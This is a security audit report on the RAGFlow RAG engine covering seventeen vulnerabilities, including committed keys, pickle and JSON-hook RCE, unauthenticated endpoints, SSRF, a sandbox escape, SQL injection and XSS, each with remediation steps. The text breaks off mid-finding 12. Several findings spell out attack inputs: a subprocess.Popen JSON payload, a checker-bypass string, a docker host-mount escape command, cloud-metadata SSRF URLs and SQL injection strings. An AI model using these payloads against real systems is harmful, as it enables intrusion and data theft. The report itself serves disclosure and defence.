# RAGFlow Security Audit Report

**Target:** RAGFlow (open-source RAG engine)
**Repository:** https://github.com/infiniflow/ragflow
**Audited Commit:** `c81081f8e` (Refactor: Doc change parser #14327)
**Docker Image:** `infiniflow/ragflow@sha256:0698a8733efd...` (v0.25.0-91-gc5116b90e)
**Audit Date:** 2026-04-27
**Verification Date:** 2026-04-28
**Classification:** Confidential

---

## Executive Summary

This report presents the findings of a source-level and dynamic security audit of the RAGFlow codebase. Sixteen exploitable vulnerabilities and one defense-in-depth recommendation were identified, spanning CRITICAL to MEDIUM severity. All findings were confirmed with working proof-of-concept exploit scripts. Eight findings were additionally validated against a live RAGFlow instance over HTTP; the remaining nine were confirmed through standalone or local code-execution proofs against the exact audited code paths. The vulnerabilities span authentication, serialization, access control, server-side request forgery, container security, SQL injection, cross-site scripting, insecure direct object reference, and cross-tenant data isolation.

The most severe findings are three distinct RCE vectors (findings 2, 4, and a component of finding 1) that can be triggered by any attacker who obtains write access to the MySQL database, which itself uses default credentials committed to the repository. Finding 6 was live-confirmed as an unauthenticated file write into another user's storage bucket. Finding 9 remains a serious deployment-level risk where a security-checker bypass is paired with a privileged sandbox configuration and Docker socket access; the exact host-compromise outcome depends on the sandbox profile being enabled in deployment. Finding 10 reveals a CRITICAL SQL injection in the ExeSQL agent tool where user chat messages flow directly into `cursor.execute()` with trivially bypassable filtering. Finding 16 was live-confirmed by mutating a real victim tenant's model configuration from a different authenticated account. Finding 12 (Jinja2 template rendering) is categorized as a defense-in-depth recommendation: the `SandboxedEnvironment` correctly blocks all known bypass payloads in Jinja2 3.1.6, but the pattern of rendering user-controlled templates server-side creates an ongoing risk surface.

---

## Methodology

1. Static source code analysis of Python backend (`api/`, `rag/`, `agent/`), frontend (`web/`), and infrastructure (`docker/`)
2. Identification of high-risk patterns: unsafe deserialization, cryptographic misuse, missing authentication decorators, dynamic code instantiation, SQL injection, IDOR
3. Development of self-contained PoC scripts exercising the exact code paths
4. **Live dynamic confirmation** against an isolated Docker environment using the pinned image (`infiniflow/ragflow@sha256:0698a8...`, v0.25.0-91-gc5116b90e):
   - Findings 1, 5–7, 13, 15–17: live HTTP requests against a running RAGFlow instance
   - Findings 2–4, 8–12, 14: standalone or local code-execution proofs against the exact audited code paths

All 17 findings were confirmed: 9 via standalone/local code execution and 8 via live HTTP requests against the running server. See [Verification Summary](#verification-summary) for detailed live test results.

---

## Findings Summary

| # | Title | Severity | PoC Script | Confirmation Method |
|---|-------|----------|------------|---------------------|
| 1 | Committed RSA Private Key with Hardcoded Passphrase | **CRITICAL** | `01_rsa_key_compromise.py` | Standalone + Live HTTP |
| 2 | Unsafe Pickle Deserialization (RCE) | **CRITICAL** | `02_pickle_deserialization_rce.py` | Standalone (RCE proof file) |
| 3 | JWT Tokens Never Expire | **HIGH** | `03_jwt_no_expiry.py` | Standalone (token age test) |
| 4 | Arbitrary Class Instantiation via JSON Hook (RCE) | **HIGH** | `04_from_dict_hook_rce.py` | Standalone (RCE proof file) |
| 5 | Unauthenticated Document Image Retrieval | **HIGH** | `05_unauth_document_image.py` | Live HTTP (route reachable without auth) |
| 6 | Unauthenticated Agent File Upload | **CRITICAL** | `06_unauth_agent_upload.py` | Live HTTP (real unauthenticated upload into victim-owned bucket) |
| 7 | Unauthenticated Agent File Download | **HIGH** | `07_unauth_agent_download.py` | Live HTTP (real unauthenticated file download) |
| 8 | SSRF via Invoke Component (No URL Validation) | **HIGH** | `08_ssrf_invoke_component.py` | Standalone (AST + grep) |
| 9 | Privileged Sandbox Container with Security Checker Bypass | **CRITICAL** | `09_privileged_sandbox_escape.py` | Standalone (config + AST bypass) |
| 10 | SQL Injection in ExeSQL Agent Tool | **CRITICAL** | `10_exesql_sqli.py` | Standalone (regex bypass) |
| 11 | Stored XSS via Malicious DOCX Preview | **HIGH** | `11_stored_xss_docx.py` | Standalone (source analysis) |
| 12 | Server-Side Template Rendering (Defense-in-Depth) | **MEDIUM** | `12_jinja2_sandbox_bypass.py` | Standalone (sandbox test) |
| 13 | Unauthenticated Webhook Triggers Full Agent Execution | **HIGH** | `13_unauth_webhook_execution.py` | Live HTTP (real unauthenticated webhook execution) |
| 14 | ODBC/CLI Connection String Injection in MSSQL and DB2 | **HIGH** | `14_odbc_connstr_injection.py` | Standalone (injection demo) |
| 15 | Unauthenticated Bulk Document Thumbnail Retrieval | **HIGH** | `15_unauth_bulk_thumbnails.py` | Live HTTP (real victim doc ID queried without auth) |
| 16 | IDOR in Tenant LLM Model Configuration Update | **HIGH** | `16_idor_tenant_model_update.py` | Live HTTP (real victim tenant mutated cross-tenant) |
| 17 | Cross-Tenant Knowledge Base Document Injection | **HIGH** | `17_cross_tenant_kb_injection.py` | Live HTTP (real attacker file injected into victim dataset) |

---

## Detailed Findings

---

### Finding 1: Committed RSA Private Key with Hardcoded Passphrase

**Severity:** CRITICAL (CVSS 9.1 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

**Affected Component:** `api/utils/crypt.py`

**Affected Files and Lines:**
- `conf/private.pem` — encrypted RSA private key committed to VCS
- `conf/public.pem` — RSA public key committed to VCS
- `api/utils/crypt.py:31` — `RSA.importKey(..., "Welcome")` (public key)
- `api/utils/crypt.py:40` — `RSA.importKey(..., "Welcome")` (private key)

**Description:**

The RSA key pair used to protect login passwords is committed directly to the Git repository. The private key is protected by the hardcoded passphrase `"Welcome"`, which appears in plaintext in `crypt.py`. Both the passphrase and the key material are therefore available to any party with repository read access.

The `crypt()` function encrypts login passwords (base64-encodes the password, RSA-encrypts with the public key, base64-encodes the ciphertext). The `decrypt()` function reverses this. Because both keys and the passphrase are public knowledge, this provides no confidentiality.

**Attack Scenario:**

1. Attacker clones or reads the repository (or accesses any copy of it).
2. Attacker intercepts or reads a login request (from logs, network capture, or database).
3. Using the committed `conf/private.pem` and passphrase `"Welcome"`, attacker decrypts the intercepted ciphertext and recovers the plaintext password.
4. Attacker uses recovered credentials to log in as the victim.

**PoC:** `autofyn_audit/exploits/01_rsa_key_compromise.py`
```
python autofyn_audit/exploits/01_rsa_key_compromise.py
```
Expected output: `RESULT: CONFIRMED`

**Remediation:**

1. Immediately rotate the RSA key pair — generate new keys with a strong randomly generated passphrase stored in a secrets manager (not the repository).
2. Remove `conf/private.pem` and `conf/public.pem` from the repository and from all Git history (use `git filter-repo` or BFG Repo Cleaner).
3. Store the passphrase as an environment variable or mounted secret, never in source code.
4. Consider replacing RSA-encrypted password transport with TLS (the canonical solution — transport-layer encryption makes application-level password encryption redundant).

---

### Finding 2: Unsafe Pickle Deserialization (RCE)

**Severity:** CRITICAL (CVSS 9.8 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Affected Component:** `api/utils/configs.py`, `api/db/db_models.py`

**Affected Files and Lines:**
- `api/utils/configs.py:53-61` — `deserialize_b64()` calls `pickle.loads()` unconditionally
- `api/utils/configs.py:57-59` — safe path guarded by `use_deserialize_safe_module` (default: `False`)
- `api/db/db_models.py:116-118` — `SerializedField.python_value()` calls `deserialize_b64()`

**Description:**

`deserialize_b64()` deserializes data from LONGTEXT database columns using `pickle.loads()`. A `RestrictedUnpickler` exists but is disabled: the guard condition `get_base_config('use_deserialize_safe_module', False)` defaults to `False` and the configuration key is set nowhere in the codebase. `pickle.loads()` on attacker-controlled data is a well-known RCE primitive, and the standalone PoC in this audit exercises the exact deserialization path used by the application.

The MySQL database uses default credentials `root/infini_rag_flow` (committed in `docker/.env`), making write access to any table trivially achievable from the network.

**Attack Scenario:**

1. Attacker connects to MySQL using default credentials `root/infini_rag_flow`.
2. Attacker base64-encodes a malicious pickle payload (e.g., `__reduce__` calling `os.system`).
3. Attacker writes the payload to any `LONGTEXT` column that maps to a `SerializedField`.
4. The next ORM read of that row calls `SerializedField.python_value()` → `deserialize_b64()` → `pickle.loads()`, executing arbitrary code with the privileges of the RAGFlow server process.

**PoC:** `autofyn_audit/exploits/02_pickle_deserialization_rce.py`
```
python autofyn_audit/exploits/02_pickle_deserialization_rce.py
```
Expected output: `RESULT: CONFIRMED`, proof file created at `/tmp/pickle_rce_proof.txt`

**Remediation:**

1. Enable `use_deserialize_safe_module = true` in `service_conf.yaml` and set it as the default to `True`.
2. Expand `safe_module` in `RestrictedUnpickler` to include all modules that legitimately store pickled data.
3. Long-term: migrate serialized columns from pickle to JSON with a schema-validated deserializer (pickle is fundamentally unsafe for untrusted data).
4. Rotate MySQL credentials immediately; remove default credentials from all committed files.

---

### Finding 3: JWT Tokens Never Expire

**Severity:** HIGH (CVSS 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Affected Component:** `api/apps/__init__.py`, `api/db/db_models.py`

**Affected Files and Lines:**
- `api/db/db_models.py:729-730` — `Serializer(...)` then `jwt.dumps(str(self.access_token))` — no expiry parameter
- `api/apps/__init__.py:114` — `jwt.loads(auth_token)` — no `max_age` parameter

**Description:**

RAGFlow uses `itsdangerous.URLSafeTimedSerializer` for session tokens. This serializer embeds a Unix timestamp in every token, and the `loads()` method accepts a `max_age` parameter to reject tokens older than a given number of seconds. However, RAGFlow's `_load_user()` calls `loads()` without `max_age`, meaning every token is accepted regardless of age.

A token created at account creation time remains valid indefinitely. There is no server-side expiry, no token rotation, and no revocation mechanism for individual tokens.

**Attack Scenario:**

1. Attacker obtains a RAGFlow authentication token (from a log file, network capture, compromised client, or social engineering).
2. Attacker uses the token to authenticate as the victim one week, one month, or one year later.
3. The token is accepted — there is no time-based rejection and no way for the victim to invalidate only that token without changing their password.

**PoC:** `autofyn_audit/exploits/03_jwt_no_expiry.py`
```
python autofyn_audit/exploits/03_jwt_no_expiry.py
```
Expected output: `RESULT: CONFIRMED` — token rejected with `max_age=1`, accepted without `max_age`.

**Remediation:**

1. Pass `max_age` to `jwt.loads()` in `_load_user()`:
   ```python
   access_token = str(jwt.loads(auth_token, max_age=TOKEN_MAX_AGE_SECONDS))
   ```
2. Choose a reasonable `TOKEN_MAX_AGE_SECONDS` (e.g., 86400 = 24 hours, or 604800 = 7 days).
3. Implement a token refresh endpoint so clients can renew tokens before expiry.
4. Optionally implement a token revocation list (store revoked token hashes in Redis) for explicit logout support.

---

### Finding 4: Arbitrary Class Instantiation via JSON Object Hook (RCE)

**Severity:** HIGH (CVSS 8.8 — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

**Affected Component:** `api/utils/__init__.py`, `api/db/db_models.py`

**Affected Files and Lines:**
- `api/utils/__init__.py:19-27` — `from_dict_hook()` calls `importlib.import_module()` and `getattr(module, type)(**data)`
- `api/db/db_models.py:255-257` — `JsonSerializedField` uses `from_dict_hook` as default `object_hook`

**Description:**

`from_dict_hook()` is registered as the `object_hook` for `json.loads()` in `JsonSerializedField`. When deserializing, it inspects every JSON object for `"module"`, `"type"`, and `"data"` keys. If present, it imports the named module and instantiates the named class with `**data`. This allows arbitrary Python class instantiation from database-stored JSON.

An attacker who can write to any `JsonSerializedField` column can trigger instantiation of `subprocess.Popen`, `os.system`, or any other callable — achieving RCE when the row is next read.

**Attack Scenario:**

1. Attacker connects to MySQL using default credentials.
2. Attacker writes the following JSON to a `JsonSerializedField` column:
   ```json
   {"module": "subprocess", "type": "Popen", "data": {"args": ["attacker_binary"], "stdout": -1}}
   ```
3. When RAGFlow reads the row, `json.loads(..., object_hook=from_dict_hook)` instantiates `subprocess.Popen(args=["attacker_binary"], stdout=-1)`, executing arbitrary code.

**PoC:** `autofyn_audit/exploits/04_from_dict_hook_rce.py`
```
python autofyn_audit/exploits/04_from_dict_hook_rce.py
```
Expected output: `RESULT: CONFIRMED` — `subprocess.Popen` instantiated and `id` command output captured.

**Remediation:**

1. Remove `from_dict_hook` as a default `object_hook` from `JsonSerializedField`. Use it only for specific trusted internal serialization paths where the data origin is verified.
2. If type-preserving deserialization is required, implement a strict allowlist: enumerate the exact set of permitted module+type combinations, and reject anything not on the list.
3. Consider replacing this mechanism with a typed schema (e.g., Pydantic models) that does not involve dynamic class instantiation.

---

### Finding 5: Unauthenticated Document Image Retrieval

**Severity:** HIGH (CVSS 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Affected Component:** `api/apps/restful_apis/document_api.py`

**Affected Files and Lines:**
- `api/apps/restful_apis/document_api.py:1633-1666` — `get_document_image()` — no `@login_required`
- `api/apps/restful_apis/document_api.py:57` — adjacent `upload_info()` — has `@login_required`

**Description:**

The endpoint `GET /api/v1/documents/images/<image_id>` serves document images from MinIO object storage. It has no `@login_required` decorator and performs no authentication or authorization check. The `image_id` parameter is parsed as `<bucket>-<object_name>` and passed directly to the MinIO storage backend.

Every other document endpoint in the same file (`upload_info`, `list_docs`, `update_document`, etc.) carries the `@login_required` decorator. This endpoint was likely missed during a code review.

**Attack Scenario:**

1. Attacker identifies the `/api/v1/documents/images/` endpoint (publicly documented API).
2. Attacker enumerates or guesses `<bucket>-<object_name>` pairs (bucket names correlate with tenant IDs; object names are document-derived UUIDs).
3. Attacker retrieves document images without any authentication, bypassing all access controls.
4. Sensitive document content (scanned contracts, invoices, personal data) is exposed to unauthenticated parties.

**PoC:** `autofyn_audit/exploits/05_unauth_document_image.py`
```
python autofyn_audit/exploits/05_unauth_document_image.py --url http://localhost:9381
```
Expected output: `RESULT: CONFIRMED` — protected endpoint returns 401; image endpoint returns non-401.

Static analysis (no server required):
```
python autofyn_audit/exploits/05_unauth_document_image.py
```
Expected output: `RESULT: CONFIRMED (static analysis)`

**Remediation:**

1. Add `@login_required` and `@add_tenant_id_to_kwargs` decorators to `get_document_image()`.
2. After authentication, verify that the requesting user's tenant owns the bucket referenced in `image_id`.
3. Audit all routes in `document_api.py` (and other API files) for missing authentication decorators — add a linter rule or decorator-enforcement test.

---

### Finding 6: Unauthenticated Agent File Upload

**Severity:** CRITICAL (CVSS 9.1 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

**Affected Component:** `api/apps/restful_apis/agent_api.py`

**Affected Files and Lines:**
- `api/apps/restful_apis/agent_api.py:408-425` — `upload_agent_file()` — no `@login_required`
- `api/apps/restful_apis/agent_api.py:428-429` — adjacent `get_agent_component_input_form()` — has `@login_required`

**Description:**

The endpoint `POST /api/v1/agents/<agent_id>/upload` accepts file uploads for a given agent. It has no `@login_required` decorator and performs no authentication check. On lines 410-414, it fetches the agent canvas, retrieves `canvas["user_id"]`, and calls `FileService.upload_info(user_id, ...)` — meaning the uploaded file is written to the **agent owner's** storage bucket, not the caller's.

The `url=` query parameter passed to `upload_info` is protected by `FileService._validate_url_for_crawl` which calls `assert_url_is_safe` (SSRF guard present for that vector). The critical vulnerability is solely the missing authentication: any unauthenticated party can write arbitrary files to any authenticated user's storage bucket by knowing or guessing a valid `agent_id`.

**Attack Scenario:**

1. Attacker enumerates or guesses a valid agent ID (UUIDs are public in agent listing responses for authenticated users; IDs may leak through logs or other means).
2. Attacker POSTs a file to `/api/v1/agents/<agent_id>/upload` without any authentication header.
3. The file is written to the agent owner's MinIO storage bucket under their user namespace.
4. Attacker can poison agent file storage with malicious content, overwrite legitimate files, or fill storage to cause denial of service.

**PoC:** `autofyn_audit/exploits/06_unauth_agent_upload.py`
```
python autofyn_audit/exploits/06_unauth_agent_upload.py --url http://localhost:9381
```
Expected output: `RESULT: CONFIRMED` — protected `/v1/agents` returns code:401; upload endpoint returns non-401 (canvas not found error), confirming auth bypass.

Static analysis (no server required):
```
python autofyn_audit/exploits/06_unauth_agent_upload.py
```
Expected output: `RESULT: CONFIRMED (static analysis)`

**Remediation:**

1. Add `@login_required` and `@add_tenant_id_to_kwargs` decorators to `upload_agent_file()`.
2. After authentication, verify that the requesting user is the owner of the canvas (`UserCanvasService.accessible(agent_id, tenant_id)`) before accepting the upload.
3. Conduct a full audit of all `agent_api.py` routes for missing `@login_required` decorators.

---

### Finding 7: Unauthenticated Agent File Download

**Severity:** HIGH (CVSS 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Affected Component:** `api/apps/restful_apis/agent_api.py`

**Affected Files and Lines:**
- `api/apps/restful_apis/agent_api.py:232-237` — `download_agent_file()` — no `@login_required`
- `api/apps/restful_apis/agent_api.py:219-221` — adjacent `delete_agent_session_item()` — has `@login_required`

**Description:**

The endpoint `GET /api/v1/agents/download` serves files from MinIO storage. It has no `@login_required` decorator. The function takes `created_by` and `id` from query parameters and calls `FileService.get_blob(created_by, id)`, which reads from bucket `f"{created_by}-downloads"` and returns the raw blob as a `Response`.

Any unauthenticated party who knows (or can enumerate) a target user's `user_id` and a file `id` can retrieve arbitrary agent output files, bypassing all access controls.

**Attack Scenario:**

1. Attacker obtains a user ID (user IDs are UUIDs that may appear in API responses, URLs, or logs).
2. Attacker enumerates file IDs (sequential UUIDs may be predictable; files may be referenced in other leaked metadata).
3. Attacker GETs `/api/v1/agents/download?created_by=<user_id>&id=<file_id>` with no auth headers.
4. The server returns the file contents directly — no authorization check performed.

**PoC:** `autofyn_audit/exploits/07_unauth_agent_download.py`
```
python autofyn_audit/exploits/07_unauth_agent_download.py --url http://localhost:9381
```
Expected output: `RESULT: CONFIRMED` — protected endpoint returns code:401; download endpoint returns non-401 (storage error), confirming auth bypass.

Static analysis (no server required):
```
python autofyn_audit/exploits/07_unauth_agent_download.py
```
Expected output: `RESULT: CONFIRMED (static analysis)`

**Remediation:**

1. Add `@login_required` and `@add_tenant_id_to_kwargs` decorators to `download_agent_file()`.
2. After authentication, verify that `created_by == tenant_id` (the requesting user may only download their own files).
3. Audit all download/blob-serving endpoints in `agent_api.py` for missing authentication.

---

### Finding 8: SSRF via Invoke Component (No URL Validation)

**Severity:** HIGH (CVSS 8.6 — AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)

**Affected Component:** `agent/component/invoke.py`

**Affected Files and Lines:**
- `agent/component/invoke.py:168-172` — `_build_url()` — no SSRF validation
- `agent/component/invoke.py:189` — `_send_request()` — passes URL directly to `requests.*`

**Description:**

The Invoke workflow component allows users to configure an arbitrary HTTP endpoint URL that the RAGFlow server will call during agent execution. The `_build_url()` method (lines 168-172) resolves template variables in the URL string and prepends `http://` if missing — but performs no validation of the resulting URL. `_send_request()` passes the URL directly to `requests.get/post/put` with no filtering.

This is a direct contrast with `FileService._validate_url_for_crawl`, which calls `assert_url_is_safe` and validates scheme, hostname, and DNS-resolved IP addresses before making requests. The Invoke component has no equivalent protection.

Any authenticated user who can create or modify a workflow canvas can configure the Invoke component with internal URLs to probe or interact with services on the server's internal network, cloud provider metadata APIs, or the host loopback interface.

**Attack Scenario:**

1. Attacker creates a workflow canvas and adds an Invoke component.
2. Attacker sets the URL to `http://169.254.169.254/latest/meta-data/` (AWS instance metadata).
3. When the workflow executes, the RAGFlow server sends an HTTP GET to the metadata endpoint.
4. The response is returned to the attacker via the workflow output — leaking cloud credentials, instance identity, and other metadata.
5. Alternatively: `http://127.0.0.1:6379/` probes Redis; `http://mysql:3306/` probes MySQL; `http://10.0.0.1/` probes the internal network.

**PoC:** `autofyn_audit/exploits/08_ssrf_invoke_component.py`
```
python autofyn_audit/exploits/08_ssrf_invoke_component.py
```
Expected output: `RESULT: CONFIRMED` — static code analysis confirms zero SSRF guards in `invoke.py`; internal/metadata URLs pass through `_build_url` unchanged.

**Remediation:**

1. Add SSRF validation to `_build_url()` equivalent to `FileService._validate_url_for_crawl`: validate scheme, block private IP ranges (RFC 1918, loopback, link-local), resolve hostname DNS and reject resolved private addresses.
2. Alternatively, centralize URL safety validation in a shared utility and call it from all HTTP-outbound code paths.
3. Consider an allowlist of permitted external domains as an additional defense-in-depth measure.

---

### Finding 9: Privileged Sandbox Container with Security Checker Bypass

**Severity:** CRITICAL (CVSS 9.6 — AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Affected Component:** `docker/docker-compose-base.yml`, `agent/sandbox/executor_manager/services/security.py`

**Affected Files and Lines:**
- `docker/docker-compose-base.yml:148-174` — `sandbox-executor-manager` service config
- `docker/docker-compose-base.yml:152` — `privileged: true`
- `docker/docker-compose-base.yml:157` — `/var/run/docker.sock:/var/run/docker.sock`
- `docker/docker-compose-base.yml:166` — `SANDBOX_ENABLE_SECCOMP=false` (default)
- `agent/sandbox/executor_manager/services/security.py:76-80` — `visit_Call` only checks `ast.Name` nodes

**Description:**

This finding combines two compounding issues that materially weaken the sandbox boundary:

**Part A — Dangerous container configuration:**
The `sandbox-executor-manager` service (controlled by the `sandbox` Docker Compose profile, so opt-in) is configured with:
- `privileged: true` — grants the container full access to the host kernel, equivalent to running as root on the host
- `/var/run/docker.sock:/var/run/docker.sock` volume mount — gives the container full control over the Docker daemon, enabling launch of arbitrary privileged containers on the host
- `SANDBOX_ENABLE_SECCOMP=false` (default) — disables Linux seccomp syscall filtering, removing the primary kernel attack surface mitigation

Even though the sandbox profile is opt-in, once enabled the default configuration provides very weak containment.

**Part B — Security checker bypass:**
`SecurePythonAnalyzer.visit_Call` (line 78) contains a critical logic error:

```python
if isinstance(node.func, ast.Name) and node.func.id in DANGEROUS_CALLS:
```

This check only catches calls where the function is an `ast.Name` node (a direct bare identifier like `eval()`). Any call made through a subscript lookup (`obj["key"](...)`) produces an `ast.Subscript` node as `node.func` — which `isinstance(..., ast.Name)` evaluates to `False`, silently skipping the check.

The bypass payload `__builtins__["__import__"]("os").system("id")` passes the analyzer with `is_safe=True`:
- `__builtins__["__import__"]` is a subscript call — `visit_Call` ignores it
- `"os"` is a runtime string — `visit_Import` is not triggered
- `.system("id")` is called on the returned module object — `visit_Attribute` only checks the immediate left-hand side name against `DANGEROUS_IMPORTS`, not chained calls

**Combined attack scenario:**

1. Attacker configures a Code Executor component in a workflow canvas with the bypass payload.
2. The security checker approves the code as safe (`is_safe=True`).
3. The code executes inside the sandbox container, gaining OS-level access.
4. From within the privileged container with Docker socket access, attacker spawns a new container mounting the host filesystem: `docker run -v /:/host --rm alpine chroot /host sh`
5. Attacker is positioned to gain full read/write access to the Docker host filesystem.

**PoC:** `autofyn_audit/exploits/09_privileged_sandbox_escape.py`
```
python autofyn_audit/exploits/09_privileged_sandbox_escape.py
```
Expected output: `RESULT: CONFIRMED` — compose config confirms `privileged=true` and `docker.sock` mount; running `SecurePythonAnalyzer` on bypass payloads returns `is_safe=True`.

**Note:** The `sandbox` Docker Compose profile is opt-in. Deployments that do not enable the sandbox profile are not affected by Part A. Part B (checker bypass) affects deployments that use the sandbox code execution feature. This is therefore best read as a deployment-contingent critical risk rather than a universally reachable default-web exploit.

**Remediation:**

1. Remove `privileged: true` from the sandbox service — use targeted Linux capabilities (`cap_add`) only for the minimum required set.
2. Remove the Docker socket mount — the sandbox executor does not need to spawn new containers at runtime. If it does, use a dedicated restricted API (e.g., Docker SDK with allowlisted operations).
3. Set `SANDBOX_ENABLE_SECCOMP=true` as the default; provide a curated seccomp profile.
4. Fix `visit_Call` to check all call types, not only `ast.Name`:
   ```python
   def _get_call_name(self, node: ast.Call) -> str | None:
       if isinstance(node.func, ast.Name):
           return node.func.id
       if isinstance(node.func, ast.Attribute):
           return node.func.attr
       return None
   ```
   And also intercept subscript calls by walking the call graph more deeply.
5. Consider replacing the custom AST checker with a battle-tested sandbox (e.g., `RestrictedPython`, `PyPy sandbox`, or a language-level VM jail) rather than maintaining a hand-rolled denylist.

---

### Finding 10: SQL Injection in ExeSQL Agent Tool

**Severity:** CRITICAL (CVSS 9.8 — AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Affected Component:** `agent/tools/exesql.py`

**Affected Files and Lines:**
- `agent/tools/exesql.py:42` — default SQL parameter value is `{sys.query}` (user chat message)
- `agent/tools/exesql.py:258` — DML filter: `re.match(r"^(insert|update|delete)\b", ...)` — trivially bypassed
- `agent/tools/exesql.py:262` — `cursor.execute(single_sql)` — unsanitized user input
- `agent/tools/exesql.py:199-239` — IBM DB2 code path returns before the DML filter (zero filtering)
- `agent/tools/exesql.py:65-69` — internal DB protection bypassable via container IP

**Description:**

The ExeSQL agent tool allows users to execute SQL queries against external databases configured in workflow canvases. The default SQL parameter is literally `{sys.query}`, which resolves to the user's chat message via `string_format()` regex substitution — meaning the user's raw chat input IS the SQL query.

A DML filter at line 258 attempts to block `INSERT`, `UPDATE`, and `DELETE` statements using `re.match(r"^(insert|update|delete)\b", single_sql)`. This filter has multiple critical bypasses:

1. **Leading whitespace**: `" DELETE FROM users"` — the `^` anchor requires position 0, a leading space defeats it
2. **Unblocked destructive statements**: `DROP TABLE`, `TRUNCATE TABLE`, `ALTER TABLE`, `CREATE TABLE` — none are in the regex
3. **Data exfiltration**: `SELECT 1 UNION SELECT password FROM users` — `SELECT` is not blocked
4. **IBM DB2 code path**: The DB2 branch (lines 199-239) calls `ibm_db.exec_immediate(conn, single_sql)` and returns at line 239, before reaching the DML filter at line 258. Zero filtering on this path.

Additionally, the internal database protection (lines 65-69) only checks if `database == "rag_flow"` and then validates `host == "ragflow-mysql"`. An attacker can bypass this by using the container's IP address (e.g., `172.17.0.2`) instead of the hostname.

**Attack Scenario:**

1. Attacker with agent workflow edit access configures an ExeSQL node targeting any database (internal or external).
2. Attacker sends a chat message containing `DROP TABLE users` or `SELECT * FROM user` — the message becomes the SQL query.
3. The DML filter does not block the query (DROP is not in the regex).
4. `cursor.execute()` runs the attacker's SQL with full privileges of the configured database connection.
5. For internal DB: attacker uses container IP `172.17.0.2` instead of `ragflow-mysql` to bypass the hostname check.

**PoC:** `autofyn_audit/exploits/10_exesql_sqli.py`
```
PYTHONPATH=/path/to/repo python autofyn_audit/exploits/10_exesql_sqli.py
```
Expected output: `RESULT: CONFIRMED`

**Remediation:**

1. Use parameterized queries (`cursor.execute(sql, params)`) instead of string interpolation for all SQL execution.
2. Implement a proper SQL statement allowlist — only permit `SELECT` statements, blocking all DDL and DML.
3. Apply the filter to ALL code paths, including IBM DB2, before execution.
4. Fix the internal DB protection to check by resolved IP address, not just hostname.
5. Consider removing direct SQL execution entirely — use a read-only database connection for ExeSQL.

---

### Finding 11: Stored XSS via Malicious DOCX Preview

**Severity:** HIGH (CVSS 7.1 — AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:N)

**Affected Component:** `web/src/components/document-preview/doc-preview.tsx`, `web/src/components/document-preview/hooks.ts`

**Affected Files and Lines:**
- `web/src/components/document-preview/doc-preview.tsx:131` — `dangerouslySetInnerHTML={{ __html: htmlContent }}` without DOMPurify
- `web/src/components/document-preview/doc-preview.tsx:94-103` — mammoth output flows to `htmlContent` with no sanitization
- `web/src/components/document-preview/hooks.ts:148-151` — second unsanitized sink: `container.innerHTML = result.value`

**Description:**

The DOCX document preview component converts `.docx` files to HTML using the mammoth library, then renders the output using React's `dangerouslySetInnerHTML` without any sanitization. The data flow is:

```
mammoth.convertToHtml(arrayBuffer) → result.value → styledContent (CSS class regex only) → setHtmlContent() → dangerouslySetInnerHTML={{ __html: htmlContent }}
```

The `styledContent` transformation at lines 94-103 only performs CSS class name replacements — it applies no XSS filtering.

A second unsanitized sink exists in `hooks.ts:148-151` where `useFetchDocx()` assigns mammoth output directly to `container.innerHTML`.

Critically, **10 other components** in the same codebase use `DOMPurify.sanitize()` before `dangerouslySetInnerHTML` — including `markdown-content`, `next-markdown-content`, `chunk-card`, and `floating-chat-widget-markdown`. This shows the project is already aware of the XSS risk pattern and applies DOMPurify elsewhere, but missed this component.

**Attack Scenario:**

1. Attacker crafts a malicious `.docx` file with embedded content that causes mammoth to emit unsafe HTML or unsafe links (for example, `javascript:` URIs or future/edge-case HTML output).
2. Attacker uploads the DOCX to a knowledge base.
3. Victim opens the document preview in their browser.
4. The unsanitized HTML executes in the victim's browser context — stealing session tokens, performing actions as the victim, or exfiltrating data.

**PoC:** `autofyn_audit/exploits/11_stored_xss_docx.py`
```
python autofyn_audit/exploits/11_stored_xss_docx.py
```
Expected output: `RESULT: CONFIRMED`

**Note:** This finding is source-confirmed and high-confidence, but the audit did not include a full browser-driven end-to-end exploit against a live preview session. The confirmed issue is the unsanitized sink and unsafe HTML rendering path.

**Remediation:**

1. Add `DOMPurify.sanitize()` to `doc-preview.tsx` before passing HTML to `dangerouslySetInnerHTML`:
   ```tsx
   dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(htmlContent) }}
   ```
2. Apply the same fix to `hooks.ts:148-151` — sanitize mammoth output before assigning to `innerHTML`.
3. Add a linter rule to flag any `dangerouslySetInnerHTML` usage without an adjacent `DOMPurify.sanitize()` call.

---

### Finding 12: User-Controlled Server-Side Template Rendering (Defense-in-Depth)

**Severity:** MEDIUM (CVSS 5.4 — AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L)

**Affected Component:** `agent/component/string_transform.py`, `agent/component/message.py`

**Affected Files and Lines:**
- `agent/component/string_transform.py:21-23` — `SandboxedEnvironment()` instantiated with default config
- `agent/component/string_transform.py:101` — `_jinja2_sandbox.from_string(script)` renders user template
- `agent/component/message.py:33-35` — `SandboxedEnvironment()` instantiated with default config
- `agent/component/message.py:248` — `_jinja2_sandbox.from_string(rand_cnt)` renders user template

**Description:**

Two agent workflow components — `StringTransform` and `Message` — use Jinja2's `SandboxedEnvironment` to render user-authored templates server-side. Users with agent workflow edit access can provide arbitrary Jinja2 template strings that are rendered on the server.

**Important context:** `SandboxedEnvironment` is Jinja2's **recommended mitigation** for rendering untrusted templates. The current Jinja2 3.1.6 `SandboxedEnvironment` blocks access to dunder attributes (`__init__`, `__globals__`) and all known bypass payloads tested during this audit were correctly blocked. **This finding is a defense-in-depth recommendation, not a currently exploitable vulnerability in the tested version.**

The risk surface exists because:
- The `SandboxedEnvironment` uses default configuration with no custom security policy or template variable allowlist.
